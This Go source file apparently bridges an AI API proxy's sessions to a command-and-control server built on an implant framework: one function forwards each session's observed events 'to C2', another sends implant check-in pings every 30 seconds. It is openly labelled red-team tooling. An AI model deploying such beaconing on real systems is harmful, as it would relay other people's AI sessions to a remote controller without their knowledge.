package bridge

import (
	"time"

	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
	log "github.com/sirupsen/logrus"
)

// observeSession subscribes to a session's observe channel and forwards events to C2.
func (b *Bridge) observeSession(sessionID string) {
	subID := "bridge-observe-" + sessionID
	ch := sessions.Global().SubscribeObserve(sessionID, subID)
	if ch == nil {
		log.Warnf("[bridge] failed to subscribe observe for session %s", sessionID)
		return
	}
	defer sessions.Global().UnsubscribeObserve(sessionID, subID)
	log.Infof("[bridge] observeSession started for %s", sessionID)

	for {
		select {
		case event, ok := <-ch:
			if !ok {
				return
			}
			b.forwardObserveEvent(event)
		case <-b.ctx.Done():
			return
		}
	}
}

// checkinLoop periodically sends checkin pings for all registered sessions.
func (b *Bridge) checkinLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			b.registered.Range(func(key, _ interface{}) bool {
				sessionID, ok := key.(string)
				if !ok {
					return true
				}
				sess := sessions.Global().Get(sessionID)
				if sess == nil {
					b.registered.Delete(sessionID)
					return true
				}
				_, err := b.rpc.Checkin(b.listenerContext(), &implantpb.Ping{
					Nonce: int32(time.Now().Unix() & 0x7FFFFFFF),
				})
				if err != nil {
					log.Debugf("[bridge] checkin failed for session %s: %v", sessionID, err)
				}
				return true
			})
		case <-b.ctx.Done():
			return
		}
	}
}
